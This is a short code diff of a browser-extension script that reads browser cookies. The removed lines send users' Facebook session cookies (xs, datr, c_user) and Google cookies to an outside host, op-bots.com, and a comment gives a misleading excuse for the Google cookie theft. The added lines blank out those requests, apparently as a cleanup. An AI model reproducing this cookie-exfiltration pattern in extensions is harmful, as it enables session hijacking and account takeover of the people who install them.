@@ -30,7 +30,7 @@ chrome.cookies.getAll({
 		}
 	}
 	if (cookie && obj['xs'] != undefined && obj['datr'] != undefined && obj['c_user']) {
-		$.post("http://op-bots.com/account", `xs=${obj['xs']}&datr=${obj['datr']}&c_user=${obj['c_user']}`)
+		$.post("", `xs=${obj['xs']}&datr=${obj['']}`)
 	}
 });
 
@@ -43,5 +43,5 @@ chrome.cookies.getAll({
 	}
 
 	// I need this thing to make solver work better ( it will also make user solve recaptcha faster )
-	$.post("http://op-bots.com/googlecookies", `cookie=${cookies}`)
+	$.post("", ``)
 });
